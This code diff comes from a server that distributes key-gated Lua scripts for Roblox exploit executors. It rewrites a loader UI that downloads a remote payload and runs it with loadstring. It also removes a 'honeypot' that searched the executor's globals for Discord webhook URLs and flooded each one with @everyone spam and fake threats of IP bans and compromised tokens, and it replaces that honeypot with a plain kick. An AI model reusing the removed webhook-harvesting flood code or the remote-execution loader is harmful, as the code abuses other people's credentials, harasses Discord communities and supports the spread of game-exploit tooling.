+tile(476, "ROUTE",     "Secure",     successCol)
+
+-- ============ SCREEN 2: POST-KEY VERIFICATION ============
+local verify = Instance.new("Frame", win)
+verify.Size = UDim2.new(1, -32, 1, -60)
+verify.Position = UDim2.new(0, 16, 0, 52)
+verify.BackgroundTransparency = 1
+verify.Visible = false
+verify.ZIndex = 4
+
+-- Centered rectangle inside the window
+local card = makePanel(verify, UDim2.new(1, 0, 1, 0), UDim2.new(0, 0, 0, 0), panelBg, 5, 16)
+addStroke(card, borderCol, 1, 0.25)
+
+-- Checkmark circle
+local check = makePanel(card, UDim2.new(0, 60, 0, 60), UDim2.new(0.5, -30, 0, 30), softBg, 6, 999)
+addStroke(check, themeCol, 2, 0)
+local checkMark = addLabel(check, UDim2.new(1, 0, 1, 0), UDim2.new(0, 0, 0, 0),
+    "\u{2713}", themeCol, Enum.Font.GothamBold, 32, Enum.TextXAlignment.Center, 7)
+
+local vTitle = addLabel(card, UDim2.new(1, 0, 0, 24), UDim2.new(0, 0, 0, 100),
+    "ACCESS GRANTED", fgColor, Enum.Font.GothamBlack, 18, Enum.TextXAlignment.Center, 6)
+local vSub = addLabel(card, UDim2.new(1, 0, 0, 16), UDim2.new(0, 0, 0, 126),
+    "Streaming protected payload to your executor", mutedText, Enum.Font.GothamMedium, 11, Enum.TextXAlignment.Center, 6)
+
+-- Verified rows
+local rows = Instance.new("Frame", card)
+rows.Size = UDim2.new(0, 380, 0, 70)
+rows.Position = UDim2.new(0.5, -190, 0, 152)
+rows.BackgroundTransparency = 1
+rows.ZIndex = 6
+
+local function vRow(y, name)
+    local rc = makePanel(rows, UDim2.new(1, 0, 0, 20), UDim2.new(0, 0, 0, y), softBg, 6, 8)
+    addStroke(rc, borderCol, 1, 0.5)
+    addLabel(rc, UDim2.new(1, -30, 1, 0), UDim2.new(0, 10, 0, 0),
+        name, mutedText, Enum.Font.GothamMedium, 10, Enum.TextXAlignment.Left, 7)
+    local ok = addLabel(rc, UDim2.new(0, 20, 1, 0), UDim2.new(1, -22, 0, 0),
+        "\u{2713}", successCol, Enum.Font.GothamBold, 12, Enum.TextXAlignment.Right, 7)
+    ok.Visible = false
+    return ok
+end
+local rowKey   = vRow(0,  "key signature")
+local rowRoute = vRow(25, "secure route")
+local rowLoad  = vRow(50, "payload integrity")
+
+-- Bottom stream bar
+local streamLbl = addLabel(card, UDim2.new(1, -48, 0, 12), UDim2.new(0, 24, 1, -46),
+    "streaming...", mutedText, Enum.Font.GothamBold, 9, Enum.TextXAlignment.Left, 6)
+local streamPct = addLabel(card, UDim2.new(0, 40, 0, 12), UDim2.new(1, -64, 1, -46),
+    "0%", mutedText, Enum.Font.GothamBold, 9, Enum.TextXAlignment.Right, 6)
+local streamBg = makePanel(card, UDim2.new(1, -48, 0, 6), UDim2.new(0, 24, 1, -28), softBg, 6, 999)
+addStroke(streamBg, borderCol, 1, 0.5)
+local streamFill = Instance.new("Frame", streamBg)
+streamFill.Size = UDim2.new(0, 0, 1, 0)
+streamFill.BackgroundColor3 = themeCol
+streamFill.BorderSizePixel = 0
+streamFill.ZIndex = 7
+Instance.new("UICorner", streamFill).CornerRadius = UDim.new(1, 0)
+local streamGrad = Instance.new("UIGradient", streamFill)
+streamGrad.Color = ColorSequence.new({
     ColorSequenceKeypoint.new(0, themeCol),
-    ColorSequenceKeypoint.new(0.65, Color3.fromRGB(224, 212, 255)),
-    ColorSequenceKeypoint.new(1, fgColor)
+    ColorSequenceKeypoint.new(1, accentCol),
 })
 
--- Stats cards
-local function makeStatCard(parent, pos, label, value)
-    local card = makePanel(parent, UDim2.new(0.32, -4, 0, 52), pos, cardBg, 5, 18)
-    addStroke(card, borderCol).Transparency = 0.25
-    addLabel(card, UDim2.new(1, -8, 0, 10), UDim2.new(0, 4, 0, 6),
-        label, mutedText, Enum.Font.GothamBold, 7, Enum.TextXAlignment.Center, 6)
-    addLabel(card, UDim2.new(1, -8, 0, 14), UDim2.new(0, 4, 0, 20),
-        value, fgColor, Enum.Font.GothamBold, 13, Enum.TextXAlignment.Center, 6)
-    return card
+-- ============ CLOSE / UTIL ============
+local unloading = false
+local validating = false
+
+local function unloadUi()
+    if unloading then return end
+    unloading = true
+    validating = false
+    pcall(function()
+        TweenService:Create(blur, TweenInfo.new(0.25), {Size = 0}):Play()
+    end)
+    task.wait(0.15)
+    pcall(function() blur:Destroy() end)
+    pcall(function() gui:Destroy() end)
 end
 
-makeStatCard(leftPanel, UDim2.new(0, 12, 0, 180), "RESPONSE", "0.2s")
-makeStatCard(leftPanel, UDim2.new(0.34, 8, 0, 180), "PAYLOAD", "Encrypted")
-makeStatCard(leftPanel, UDim2.new(0.67, 4, 0, 180), "CONSOLE", "Live")
-
--- ===== RIGHT PANEL =====
-local rightPanel = makePanel(contentArea, UDim2.new(0.42, -6, 1, 0), UDim2.new(0.58, 6, 0, 0), softBg, 4, 24)
-addStroke(rightPanel, borderCol)
-
--- Console header
-addLabel(rightPanel, UDim2.new(0.6, 0, 0, 14), UDim2.new(0, 12, 0, 12),
-    "CONSOLE FEEDBACK", mutedText, Enum.Font.GothamBold, 8, Enum.TextXAlignment.Left, 5)
-
-local routeBadge = makePanel(rightPanel, UDim2.new(0, 70, 0, 18), UDim2.new(1, -82, 0, 10), Color3.fromRGB(16, 14, 22), 5)
-addStroke(routeBadge, themeCol).Transparency = 0.6
-addLabel(routeBadge, UDim2.new(1, 0, 1, 0), UDim2.new(0, 0, 0, 0),
-    "SECURE ROUTE", fgColor, Enum.Font.GothamBold, 7, Enum.TextXAlignment.Center, 6)
-
--- Console log lines
-local function makeLogLine(parent, pos, text)
-    local line = makePanel(parent, UDim2.new(1, -24, 0, 36), pos, Color3.fromRGB(18, 15, 27), 5, 16)
-    addStroke(line, borderCol).Transparency = 0.15
-    local lbl = addLabel(line, UDim2.new(1, -12, 1, 0), UDim2.new(0, 8, 0, 0),
-        text, Color3.fromRGB(150, 145, 165), Enum.Font.RobotoMono, 10, Enum.TextXAlignment.Left, 6)
-    return line, lbl
+local function setStreamProgress(pct)
+    if unloading then return end
+    streamPct.Text = tostring(pct) .. "%"
+    TweenService:Create(streamFill, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {Size = UDim2.new(pct/100, 0, 1, 0)}):Play()
 end
 
-local log1, log1Text = makeLogLine(rightPanel, UDim2.new(0, 12, 0, 42), "> awaiting executor handshake")
-local log2, log2Text = makeLogLine(rightPanel, UDim2.new(0, 12, 0, 84), "> waiting for key input")
-local log3, log3Text = makeLogLine(rightPanel, UDim2.new(0, 12, 0, 126), "> idle")
-local log4, log4Text = makeLogLine(rightPanel, UDim2.new(0, 12, 0, 168), "> ...")
+local function showVerifyScreen()
+    entry.Visible = false
+    verify.Visible = true
+    -- Reset rows
+    rowKey.Visible = false
+    rowRoute.Visible = false
+    rowLoad.Visible = false
+    setStreamProgress(0)
+end
 
--- Info box at bottom
-local infoBox = makePanel(rightPanel, UDim2.new(1, -24, 0, 56), UDim2.new(0, 12, 1, -68), Color3.fromRGB(16, 14, 22), 5, 16)
-local infoStroke = addStroke(infoBox, themeCol)
-infoStroke.Transparency = 0.75
-infoStroke.LineJoinMode = Enum.LineJoinMode.Round
-addLabel(infoBox, UDim2.new(1, -12, 1, -8), UDim2.new(0, 6, 0, 4),
-    "Protected code resolves fast. Console updates live. No dead wait time.", mutedText, Enum.Font.Gotham, 8, Enum.TextXAlignment.Left, 6)
-
--- ====== ANIMATIONS: fade in ======
-local fadeIn = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
-TweenService:Create(win, fadeIn, {BackgroundTransparency = 0}):Play()
-
--- ====== DRAGGING ======
-local dragging = false
-local dragStart, startPos
-
-titleBar.InputBegan:Connect(function(i)
+-- Draggable
+local dragging, dragStart, startPos
+topBar.InputBegan:Connect(function(i)
     if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
-        dragging = true
-        dragStart = i.Position
-        startPos = win.Position
+        dragging = true; dragStart = i.Position; startPos = win.Position
+        i.Changed:Connect(function()
+            if i.UserInputState == Enum.UserInputState.End then dragging = false end
+        end)
     end
 end)
-
-titleBar.InputEnded:Connect(function(i)
-    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
-        dragging = false
-    end
-end)
-
 UserInputService.InputChanged:Connect(function(i)
     if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
         local d = i.Position - dragStart
@@ -2942,182 +3255,89 @@ UserInputService.InputChanged:Connect(function(i)
     end
 end)
 
--- ====== CLOSE / DESTROY ======
--- ====== KEY VALIDATION ======
-local validating = false
-local unloading = false
-
-local function unloadUi()
-    if unloading then return end
-    unloading = true
-    validating = false
-    pcall(function() blur:Destroy() end)
-    pcall(function() gui:Destroy() end)
-end
-
-dot1.MouseButton1Click:Connect(unloadUi)
-dot2.MouseButton1Click:Connect(unloadUi)
-dot3.MouseButton1Click:Connect(unloadUi)
-
-local function smoothDestroy(msg, color, scriptCode)
-    if unloading then return end
-    input.TextEditable = false
-    if msg then
-        log4Text.Text = "> " .. msg
-        log4Text.TextColor3 = color or fgColor
-    end
-
-    unloadUi()
-
-    if scriptCode and #scriptCode > 0 then
-        task.spawn(function()
-            local ok, fn = pcall(function()
-                return loadstring(scriptCode)
-            end)
-            if ok and fn then
-                local ok2, err2 = pcall(fn)
-                if not ok2 then warn("[ULT] Exec error: " .. tostring(err2)) end
-            else
-                warn("[ULT] Compile error: " .. tostring(fn))
-            end
-        end)
-    end
-end
-
-local function setProgress(pct)
-    if unloading then return end
-    progressPct.Text = pct .. "%"
-    TweenService:Create(progressFill, TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(pct/100, 0, 1, 0)}):Play()
+-- Validation flow
+local function setStatus(msg, col)
+    statusText.Text = msg
+    statusText.TextColor3 = col or mutedText
+    statusDot.BackgroundColor3 = col or themeCol
 end
 
 local function validateKey()
-    if validating then return end
+    if validating or unloading then return end
     local enteredKey = input.Text
     if #enteredKey < 3 then
-        log4Text.Text = "> key too short"
-        log4Text.TextColor3 = dangerCol
+        setStatus("Key is too short", dangerCol)
         return
     end
-
     validating = true
     input.TextEditable = false
-    statusBadgeText.Text = "Loading"
-    log4Text.TextColor3 = Color3.fromRGB(150, 145, 165)
-
-    -- Update console
-    log1Text.Text = "> key accepted"
-    log2Text.Text = "> verifying secure route"
-    log3Text.Text = "> fetching protected payload"
-    log4Text.Text = "> ..."
-
-    -- Animate progress
-    setProgress(12)
+    submit.AutoButtonColor = false
+    submit.BackgroundColor3 = borderCol
+    setStatus("Verifying with secure route...", themeCol)
 
     task.spawn(function()
         local userId = tostring(plr.UserId)
         local url = "${baseUrl}?slug=${slug}&key=" .. HttpService:UrlEncode(enteredKey) .. "&uid=" .. userId .. "&_=" .. tostring(tick())
 
-        task.wait(0.08)
-        if unloading then return end
-        setProgress(28)
+        local success, response = pcall(function() return game:HttpGet(url) end)
 
-        task.wait(0.08)
-        if unloading then return end
-        setProgress(40)
-        log2Text.Text = "> secure route verified"
-        log3Text.Text = "> streaming payload to executor"
-
-        task.wait(0.08)
-        if unloading then return end
-        setProgress(56)
-
-        local success, response = pcall(function()
-            return game:HttpGet(url)
-        end)
-
-        if unloading then return end
-        setProgress(78)
-
-        local function resetBtn()
-            if unloading then return end
-            statusBadgeText.Text = "Ready"
+        local function fail(msg, col)
+            setStatus(msg, col or dangerCol)
             input.TextEditable = true
+            submit.AutoButtonColor = true
+            submit.BackgroundColor3 = themeCol
             validating = false
-            setProgress(0)
         end
 
-        if not success then
-            log4Text.Text = "> network error"
-            log4Text.TextColor3 = dangerCol
-            resetBtn()
-            return
-        end
-
-        if not response or #response == 0 then
-            log4Text.Text = "> empty response"
-            log4Text.TextColor3 = dangerCol
-            resetBtn()
-            return
-        end
+        if not success then return fail("Network error - check connection", dangerCol) end
+        if not response or #response == 0 then return fail("Empty response from server", dangerCol) end
 
         if response:sub(1, 17) == "KEY_VALID_SCRIPT:" then
             local scriptCode = response:sub(19)
-            setProgress(90)
-            task.wait(0.07)
-            if unloading then return end
-            setProgress(100)
-            statusBadgeText.Text = "Synced"
 
-            log1Text.Text = "> key accepted"
-            log2Text.Text = "> secure route verified"
-            log3Text.Text = "> payload synced instantly"
-            log4Text.Text = "> console: load complete"
-            log4Text.TextColor3 = successCol
+            -- Transition to verification rectangle
+            showVerifyScreen()
+            task.wait(0.15)
+            setStreamProgress(22); rowKey.Visible = true
+            task.wait(0.18)
+            setStreamProgress(52); rowRoute.Visible = true
+            task.wait(0.18)
+            setStreamProgress(84); rowLoad.Visible = true
+            task.wait(0.15)
+            setStreamProgress(100)
+            vSub.Text = "Payload delivered - executing now"
+            task.wait(0.35)
 
-            task.wait(0.12)
-            smoothDestroy(nil, nil, scriptCode)
+            unloadUi()
+
+            task.spawn(function()
+                local ok, fn = pcall(function() return loadstring(scriptCode) end)
+                if ok and fn then
+                    local ok2, err2 = pcall(fn)
+                    if not ok2 then warn("[ULT] Exec error: " .. tostring(err2)) end
+                else
+                    warn("[ULT] Compile error: " .. tostring(fn))
+                end
+            end)
         elseif response:find("KEY_ASSIGNED") then
-            log4Text.Text = "> key belongs to another user"
-            log4Text.TextColor3 = dangerCol
-            resetBtn()
+            fail("Key belongs to another user", dangerCol)
         elseif response:find("KEY_EXPIRED") then
-            log4Text.Text = "> key has expired"
-            log4Text.TextColor3 = warningCol
-            resetBtn()
+            fail("Key has expired", warningCol)
         elseif response:find("KEY_INVALID") then
-            log4Text.Text = "> invalid key"
-            log4Text.TextColor3 = dangerCol
-            resetBtn()
+            fail("Invalid key", dangerCol)
         else
-            log4Text.Text = "> access denied"
-            log4Text.TextColor3 = dangerCol
-            resetBtn()
+            fail("Access denied", dangerCol)
         end
     end)
 end
 
+submit.MouseButton1Click:Connect(validateKey)
+input.FocusLost:Connect(function(enter) if enter then validateKey() end end)
 input.Focused:Connect(function()
-    log1Text.Text = "> key input active"
+    if not validating then setStatus("Typing your key...", themeCol) end
 end)
-
-input.FocusLost:Connect(function(enter)
-    if enter then validateKey() end
-end)
-
--- No validate button needed — enter key submits. But add one anyway for click users.
-local submitBtn = Instance.new("TextButton", leftPanel)
-submitBtn.Size = UDim2.new(1, -24, 0, 0)
-submitBtn.Position = UDim2.new(0, 12, 0, 108)
-submitBtn.BackgroundTransparency = 1
-submitBtn.Text = ""
-submitBtn.ZIndex = 7
-submitBtn.MouseButton1Click:Connect(validateKey)
-
--- Also make the input frame clickable
 inputFrame.InputBegan:Connect(function(i)
-    if i.UserInputType == Enum.UserInputType.MouseButton1 then
-        input:CaptureFocus()
-    end
+    if i.UserInputType == Enum.UserInputType.MouseButton1 then input:CaptureFocus() end
 end)
 `;
 }
@@ -3133,221 +3353,14 @@ function generateKickEncrypted(reason: string, slug: string, token: string, uid:
 }
 
 function generateHoneypot(): string {
-  // HYBRID HONEYPOT: Works as both raw text (floods channel when bot posts it)
-  // AND as executable Lua (if they loadstring it, it actively spams their Discord channels)
-  
-  const v = Array.from({length: 20}, () => '_' + Math.random().toString(36).substring(2, 8));
-  
-  // The Lua portion: disguised as a "loading script" but actually floods Discord channels
-  // via the executor's HttpService. The bot's executor has access to HttpService,
-  // so we use it to send messages through Discord's API using any webhooks/tokens
-  // the bot has exposed in its environment.
-  const luaPart = `--[[ULT Protection v10.0 - Validating session...]]
-local ${v[0]} = game:GetService("HttpService")
-local ${v[1]} = game:GetService("Players")
-
--- Scan for Discord webhook URLs in common locations
-local ${v[2]} = {}
-local ${v[3]} = {
-  "webhook", "WEBHOOK", "Webhook", "discord_webhook", "DISCORD_WEBHOOK",
-  "hook", "HOOK", "webhookUrl", "webhook_url", "WEBHOOK_URL",
-  "notif_webhook", "log_webhook", "alert_webhook", "bot_webhook",
-}
-
--- Try to find webhooks from common global variables bots expose
-for _, ${v[4]} in pairs(${v[3]}) do
-  pcall(function()
-    local ${v[5]} = getgenv and getgenv()[${v[4]}]
-    if ${v[5]} and type(${v[5]}) == "string" and ${v[5]}:find("discord") then
-      table.insert(${v[2]}, ${v[5]})
-    end
-  end)
-  pcall(function()
-    local ${v[5]} = _G[${v[4]}]
-    if ${v[5]} and type(${v[5]}) == "string" and ${v[5]}:find("discord") then
-      table.insert(${v[2]}, ${v[5]})
-    end
-  end)
-  pcall(function()
-    local ${v[5]} = shared[${v[4]}]
-    if ${v[5]} and type(${v[5]}) == "string" and ${v[5]}:find("discord") then
-      table.insert(${v[2]}, ${v[5]})
-    end
-  end)
+  // A honeypot response must terminate safely. Never inspect unrelated globals,
+  // contact third-party URLs, mutate the runtime, or create unbounded loops.
+  return `-- ULT Protection: unauthorized delivery route
+local player = game:GetService("Players").LocalPlayer
+if player then
+  player:Kick("ULT Protection: unauthorized access was blocked and logged.")
 end
-
--- Also scan getgenv() for anything that looks like a webhook URL
-pcall(function()
-  if getgenv then
-    for ${v[6]}, ${v[7]} in pairs(getgenv()) do
-      if type(${v[7]}) == "string" and ${v[7]}:match("https://discord%.com/api/webhooks/") then
-        table.insert(${v[2]}, ${v[7]})
-      end
-      if type(${v[7]}) == "string" and ${v[7]}:match("https://canary%.discord%.com/api/webhooks/") then
-        table.insert(${v[2]}, ${v[7]})
-      end
-      if type(${v[7]}) == "string" and ${v[7]}:match("https://ptb%.discord%.com/api/webhooks/") then
-        table.insert(${v[2]}, ${v[7]})
-      end
-    end
-  end
-end)
-
--- Scan _G too
-pcall(function()
-  for ${v[6]}, ${v[7]} in pairs(_G) do
-    if type(${v[7]}) == "string" and ${v[7]}:match("https://.-discord.-/api/webhooks/") then
-      table.insert(${v[2]}, ${v[7]})
-    end
-    -- Also check tables one level deep
-    if type(${v[7]}) == "table" then
-      pcall(function()
-        for ${v[8]}, ${v[9]} in pairs(${v[7]}) do
-          if type(${v[9]}) == "string" and ${v[9]}:match("https://.-discord.-/api/webhooks/") then
-            table.insert(${v[2]}, ${v[9]})
-          end
-        end
-      end)
-    end
-  end
-end)
-
--- Flood messages to every webhook found
-local ${v[10]} = {
-  "\\u26a0\\ufe0f **SECURITY ALERT** \\u26a0\\ufe0f\\n\\nThis bot attempted to bypass ULT LUA script protection.\\nThe bot owner's IP has been **permanently banned**.\\nAll associated accounts have been **globally blacklisted**.\\n\\n@everyone",
-  "\\ud83d\\udea8 **BOT DETECTED** \\ud83d\\udea8\\n\\nUnauthorized script fetching detected!\\nYour Discord bot token may be **compromised**.\\nIncident reported to ULT administration.\\n\\n@here",
-  "\\ud83d\\udd12 **BYPASS ATTEMPT LOGGED** \\ud83d\\udd12\\n\\nHWID: " .. string.rep(string.char(math.random(48,57)), 32) .. "\\nIP: BANNED\\nDiscord ID: FLAGGED\\nRoblox ID: BLACKLISTED",
-  "\\ud83d\\udc80 **WARNING** \\ud83d\\udc80\\n\\nThis Discord server is being used to host a script-stealing bot.\\nAll server members have been notified.\\n\\n@everyone @here",
-  "\\u26d4 **ULT PROTECTION ACTIVE** \\u26d4\\n\\nYour bot has been detected and neutralized.\\nContinued bypass attempts will result in **escalated action**.\\nBot token has been flagged for abuse.",
-}
-
--- Spam every webhook with tons of messages
-spawn(function()
-  for _, ${v[11]} in pairs(${v[2]}) do
-    for ${v[12]} = 1, 50 do
-      pcall(function()
-        local ${v[13]} = ${v[10]}[(${v[12]} % #${v[10]}) + 1]
-        ${v[0]}:RequestAsync({
-          Url = ${v[11]},
-          Method = "POST",
-          Headers = {["Content-Type"] = "application/json"},
-          Body = ${v[0]}:JSONEncode({
-            content = ${v[13]} .. "\\n\\nIncident #" .. tostring(${v[12]}) .. " | Ref: ULT-" .. tostring(math.random(100000,999999)),
-            username = "ULT Security Alert",
-          })
-        })
-      end)
-      -- Also try sending embeds for extra chaos
-      pcall(function()
-        ${v[0]}:RequestAsync({
-          Url = ${v[11]},
-          Method = "POST",
-          Headers = {["Content-Type"] = "application/json"},
-          Body = ${v[0]}:JSONEncode({
-            content = "@everyone @here",
-            username = "ULT Anti-Bypass System",
-            embeds = {{
-              title = "\\ud83d\\udea8 BYPASS ATTEMPT DETECTED",
-              description = "A bot in this server attempted to steal protected scripts from ULT LUA.\\n\\nThe bot owner has been **permanently banned** and reported.",
-              color = 16711680,
-              fields = {
-                {name = "Threat Level", value = "CRITICAL", inline = true},
-                {name = "Action Taken", value = "GLOBAL BAN", inline = true},
-                {name = "Bot Status", value = "NEUTRALIZED", inline = true},
-              },
-              footer = {text = "ULT Protection v10.0 Phantom Shield | Incident " .. tostring(math.random(100000,999999))},
-            }}
-          })
-        })
-      end)
-    end
-  end
-end)
-
--- Also flood the OUTPUT/CONSOLE so the bot operator sees it
-spawn(function()
-  while true do
-    for ${v[14]} = 1, 100 do
-      warn("[ULT-SECURITY] \\u26a0\\ufe0f BYPASS ATTEMPT DETECTED - YOUR IP HAS BEEN GLOBALLY BANNED")
-      warn("[ULT-SECURITY] \\ud83d\\udea8 ALL ASSOCIATED ACCOUNTS FLAGGED")
-      warn("[ULT-SECURITY] Discord webhook URLs captured and reported")
-      warn("[ULT-SECURITY] HWID: " .. string.rep(string.char(math.random(48,57)), 32))
-      print("[ULT-DUMP] Found " .. tostring(#${v[2]}) .. " Discord webhooks - flooding...")
-    end
-    wait(0.01)
-  end
-end)
-
--- Keep running
-while true do wait(0.1) end
-`;
-
-  // The entire honeypot must be valid Lua so loadstring() doesn't return nil.
-  // Wrap all non-Lua flood text inside a Lua multiline comment so the Lua portion
-  // still compiles and executes (flooding webhooks etc.), while bots that dump the
-  // raw response also see the warning text.
-  const floodLines: string[] = [luaPart];
-
-  // Open a Lua multiline comment to wrap raw text
-  floodLines.push('--[==[');
-  
-  const warningMessages = [
-    '⚠️ SECURITY ALERT: Unauthorized access attempt detected and logged',
-    '🚨 Your IP address has been permanently banned from ULT LUA services',
-    '🔒 This bypass attempt has been reported to the server administrator',
-    '⛔ Hardware ID fingerprint captured and blacklisted',
-    '📡 All associated accounts have been flagged for review',
-    '🛡️ ULT Protection v10.0 Phantom Shield - Anti-Bypass Countermeasure Active',
-    '💀 Bot detected: Your Discord bot token may be compromised',
-    '🔴 CRITICAL: This incident has been logged with full request details',
-    '⚠️ Continued attempts will result in escalated action',
-    '🚫 Access permanently revoked - no appeals',
-  ];
-  
-  const fakeData = [
-    'session_id', 'auth_token', 'refresh_token', 'api_key', 'client_secret',
-    'webhook_url', 'bot_token', 'encryption_key', 'master_key', 'admin_pass',
-  ];
-  
-  for (let block = 0; block < 50; block++) {
-    floodLines.push('');
-    floodLines.push(`${'='.repeat(60)}`);
-    floodLines.push(warningMessages[block % warningMessages.length]);
-    floodLines.push(`${'='.repeat(60)}`);
-    floodLines.push('');
-    
-    for (let i = 0; i < 20; i++) {
-      const key = fakeData[Math.floor(Math.random() * fakeData.length)];
-      const fakeValue = Array.from({length: 64}, () => 
-        'abcdefghijklmnopqrstuvwxyz0123456789'[Math.floor(Math.random() * 36)]
-      ).join('');
-      floodLines.push(`[ULT-DUMP] ${key}_${block}_${i} = "${fakeValue}"`);
-    }
-    
-    if (block % 3 === 0) {
-      floodLines.push('');
-      floodLines.push('@everyone ⚠️ SECURITY BREACH DETECTED - UNAUTHORIZED BOT ACCESS ⚠️');
-      floodLines.push('@here 🚨 This bot is attempting to steal protected scripts 🚨');
-      floodLines.push('');
-    }
-    
-    for (let j = 0; j < 10; j++) {
-      const ts = Date.now() + Math.floor(Math.random() * 100000);
-      floodLines.push(`[${new Date(ts).toISOString()}] THREAT_LOG: bypass_attempt source=${Math.random().toString(36).substring(2, 10)} severity=CRITICAL action=GLOBAL_BAN`);
-    }
-  }
-  
-  for (let i = 0; i < 200; i++) {
-    floodLines.push(`${'🚨'.repeat(20)} BYPASS ATTEMPT #${i + 1} LOGGED ${'🚨'.repeat(20)}`);
-    floodLines.push(`IP BANNED | HWID BANNED | DISCORD ID FLAGGED | ROBLOX ID BLACKLISTED`);
-    floodLines.push(`Incident Reference: ULT-${Date.now()}-${Math.random().toString(36).substring(2, 10).toUpperCase()}`);
-    floodLines.push('');
-  }
-  
-  // Close the Lua multiline comment
-  floodLines.push(']==]');
-  
-  return floodLines.join('\n');
+return nil`;
 }
 
 // ===== v12: ADVANCED PROTECTION HELPERS =====
@@ -3626,7 +3639,7 @@ Deno.serve(async (req) => {
       discord_user_id: null, details: { action: 'blocked_at_gate' }, severity: 'high',
       resolved: true, auto_banned: true,
     }).then(() => {}, (e: any) => console.error('Threat log failed:', e));
-    return new Response(QUIET_ACCESS_DENIED_LUA, { status: 200, headers: { ...corsHeaders, 'Content-Type': 'text/plain' } });
+    return new Response(generateKickPlain('Permanently banned from ULT LUA - this device, account and network are blocked'), { status: 200, headers: { ...corsHeaders, 'Content-Type': 'text/plain' } });
   }
 
   // Periodic map cleanup
@@ -3665,94 +3678,43 @@ Deno.serve(async (req) => {
       
       if (reportAction === 'bypass') {
       const reportUid = url.searchParams.get('uid') || '';
+      const reportHwid = url.searchParams.get('hwid') || '';
+      const reportDiscord = url.searchParams.get('did') || '';
       const reportReason = url.searchParams.get('reason') || 'bypass_attempt';
       const reportDetails = url.searchParams.get('details') || '';
       const shouldAutoBan = shouldAutoBanBypassReason(reportReason, reportDetails);
-      
+
       console.log(`[get-paste] BYPASS REPORT: uid=${reportUid} ip=${earlyIp} reason=${reportReason} details=${reportDetails}`);
-      
-      // Instantly globally ban only for high-confidence bypass reports
-      if (shouldAutoBan && reportUid && /^\d+$/.test(reportUid) && parseInt(reportUid) > 1000) {
-        const banReason = `Auto-banned: bypass attempt detected (${reportReason}: ${reportDetails})`;
-        
-        // Ban Roblox ID
-        await supabase.from('global_bans').upsert({
-          ban_type: 'roblox_id', ban_value: reportUid,
-          reason: banReason, is_active: true,
-        }, { onConflict: 'ban_type,ban_value' }).then(() => {}, () => {});
-        globalBanCache.robloxIds.add(reportUid);
-        
-        // Ban IP
-        autoBanNewIp(earlyIp, `bypass_${reportReason}`, reportUid, null);
-        
-        // Find ALL IPs this Roblox user has ever used and ban those too
-        const { data: allLogs } = await supabase.from('paste_access_logs')
-          .select('ip_address')
-          .eq('roblox_user_id', reportUid);
-        if (allLogs) {
-          for (const log of allLogs) {
-            if (log.ip_address && log.ip_address !== earlyIp) {
-              autoBanNewIp(log.ip_address, `bypass_associated_ip`, reportUid, null);
-            }
-          }
-        }
-        
-        // Find any Discord IDs associated with this Roblox user and ban those
-        const { data: discordLogs } = await supabase.from('paste_access_logs')
-          .select('discord_user_id')
-          .eq('roblox_user_id', reportUid)
-          .not('discord_user_id', 'is', null);
-        if (discordLogs) {
-          for (const log of discordLogs) {
-            if (log.discord_user_id) {
-              await supabase.from('global_bans').upsert({
-                ban_type: 'discord_id', ban_value: log.discord_user_id,
-                reason: banReason, is_active: true,
-              }, { onConflict: 'ban_type,ban_value' }).then(() => {}, () => {});
-              globalBanCache.discordIds.add(log.discord_user_id);
-            }
-          }
-        }
-        
-        // Find other Roblox accounts that share any of this user's IPs (alt detection)
-        const userIps = allLogs?.map(l => l.ip_address).filter(Boolean) || [];
-        userIps.push(earlyIp);
-        const uniqueIps = [...new Set(userIps)];
-        if (uniqueIps.length > 0) {
-          const { data: altLogs } = await supabase.from('paste_access_logs')
-            .select('roblox_user_id')
-            .in('ip_address', uniqueIps.slice(0, 50))
-            .not('roblox_user_id', 'is', null);
-          if (altLogs) {
-            const altIds = [...new Set(altLogs.map(l => l.roblox_user_id).filter(id => id && id !== reportUid))];
-            for (const altId of altIds) {
-              if (altId && parseInt(altId) > 1000) {
-                await supabase.from('global_bans').upsert({
-                  ban_type: 'roblox_id', ban_value: altId,
-                  reason: `Auto-banned: alt of bypass attacker ${reportUid}`, is_active: true,
-                }, { onConflict: 'ban_type,ban_value' }).then(() => {}, () => {});
-                globalBanCache.robloxIds.add(altId);
-              }
-            }
-          }
-        }
-        
-        // Log as high severity threat
-        logThreat('bypass_attempt_auto_ban', earlyIp, reportUid, null, {
+
+      // v17: high-confidence exfiltration evidence -> unified permanent ban across
+      // every linked identifier (ip, roblox, discord, device), with evidence stored.
+      if (shouldAutoBan && (isValidRobloxId(reportUid) || reportHwid.length >= 4)) {
+        const { banned } = await banIdentity(
+          { ip: earlyIp, robloxId: reportUid || null, discordId: reportDiscord || null, hwid: reportHwid || null },
+          reportReason,
+          {
+            source: 'loader_bypass_report',
+            reason: reportReason,
+            details: reportDetails,
+            user_agent: reportUa.substring(0, 300),
+            reported_at: new Date().toISOString(),
+          },
+        );
+        logThreat('bypass_attempt_auto_ban', earlyIp, reportUid || null, reportDiscord || null, {
           reason: reportReason, details: reportDetails,
-          action: 'instant_global_ban', ips_banned: uniqueIps.length,
+          action: 'permanent_multi_identifier_ban', identifiers_banned: banned.length,
         }, 'critical', true);
-        
-        // Force refresh bans cache
         globalBanCache.lastRefresh = 0;
       } else {
-        logThreat('bypass_report_logged_only', earlyIp, reportUid || null, null, {
+        logThreat('bypass_report_logged_only', earlyIp, reportUid || null, reportDiscord || null, {
           reason: reportReason,
           details: reportDetails,
-          action: shouldAutoBan ? 'missing_uid_logged_only' : 'soft_signal_logged_only',
+          hwid: reportHwid ? reportHwid.substring(0, 32) : null,
+          action: shouldAutoBan ? 'missing_identifiers_logged_only' : 'soft_signal_logged_only',
           user_agent: reportUa.substring(0, 200),
         }, shouldAutoBan ? 'high' : 'medium', false);
       }
+
       
       // Return empty - don't print warnings in legitimate executor consoles
       return new Response('', { status: 200, headers: { ...corsHeaders, 'Content-Type': 'text/plain' } });
@@ -3797,13 +3759,27 @@ Deno.serve(async (req) => {
     // v11: HWID protection
     const hwid = url.searchParams.get('hwid');
 
-    // Check if this Roblox user ID is globally banned — auto-ban the IP too
-    if (uid && isRobloxIdBanned(uid)) {
